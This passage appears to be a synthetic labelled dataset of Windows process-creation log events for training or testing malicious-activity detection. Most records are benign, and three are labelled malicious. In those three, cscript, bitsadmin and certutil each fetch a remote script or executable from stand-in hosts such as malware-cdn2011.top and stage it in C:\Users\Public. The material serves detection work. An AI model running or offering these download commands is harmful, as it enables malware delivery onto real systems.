    "CommandLine": "cscript.exe //e:vbscript http://malware-cdn2466.xyz/script817.vbs",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 18872,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.005",
    "technique_name": "WScript Remote Script",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T11:01:42.197Z",
    "ProcessGuid": "{CC284CBF-E440-4EA6-9E2C-087B7CFA42F1}",
    "ProcessId": 27113,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 22512,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:43:01.995Z",
    "ProcessGuid": "{5449F53D-EE6B-431C-BDBF-27CF16EE8C77}",
    "ProcessId": 12737,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job3881 /download /priority high http://malware-cdn2011.top/loader510.exe C:\\Users\\Public\\core966.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 26076,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T14:28:14.552Z",
    "ProcessGuid": "{75BDCF3F-46D2-44B1-B353-A9B7AFD76357}",
    "ProcessId": 15238,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 50439,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:21:24.773Z",
    "ProcessGuid": "{8706A249-CB13-4EB9-BD5A-2F23DB0D3655}",
    "ProcessId": 49479,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 10171,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:28:16.769Z",
    "ProcessGuid": "{DDDB4DA3-2180-47C9-849F-7CCBD85986FE}",
    "ProcessId": 17203,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 56041,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:52:00.673Z",
    "ProcessGuid": "{07ED94CA-F227-4B96-A882-24F4F8930DA2}",
    "ProcessId": 57974,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 36559,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:29:41.987Z",
    "ProcessGuid": "{8520BE74-2251-4902-86F9-0C443A55CB04}",
    "ProcessId": 3041,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 4986,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:03:50.341Z",
    "ProcessGuid": "{604FABDA-0404-4409-B217-63DBFD161D2B}",
    "ProcessId": 16962,
    "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
    "CommandLine": "Zoom.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 9252,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:04:10.445Z",
    "ProcessGuid": "{09653E19-5416-483C-AA21-7C7D0D8932D8}",
    "ProcessId": 19085,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tasklist",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 28597,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T18:05:54.619Z",
    "ProcessGuid": "{C01AA391-FABC-4B55-9E44-FB7F0647DE67}",
    "ProcessId": 9513,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil  -urlcache -split -f http://exploit-kit3604.top/downloads/runtime198.exe C:\\Users\\Public\\update25.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 25638,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T10:59:48.640Z",
    "ProcessGuid": "{4BDE376D-47D6-4650-9D25-6DE6755A9D9A}",
    "ProcessId": 4935,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 4917,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:07:48.285Z",
    "ProcessGuid": "{9976F442-E498-4A55-B9DF-8F9DFB756687}",
    "ProcessId": 38624,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 15821,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:30:13.890Z",
    "ProcessGuid": "{6AB16B59-8F62-40EE-A251-F47E0A27C946}",
    "ProcessId": 60443,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c xcopy C:\\Data D:\\Backup /s /e",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 22821,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:39:44.407Z",
    "ProcessGuid": "{E7AD46D5-0165-4793-A983-B1ED74076E44}",
    "ProcessId": 43587,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 6263,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:26:41.329Z",
    "ProcessGuid": "{A7483442-D29E-4987-9EE6-80B3774E8C45}",
    "ProcessId": 8239,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 7308,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:24:07.246Z",
    "ProcessGuid": "{FD8D4D3D-BD32-4A73-8081-9D310694089F}",
    "ProcessId": 33740,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter *\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 42817,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:25:37.205Z",
    "ProcessGuid": "{080C92FF-B256-4F7C-9209-3C361A5B7C34}",
    "ProcessId": 34930,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe https://sharepoint.corp.local/sites/team",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentProcessId": 2007,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  }
]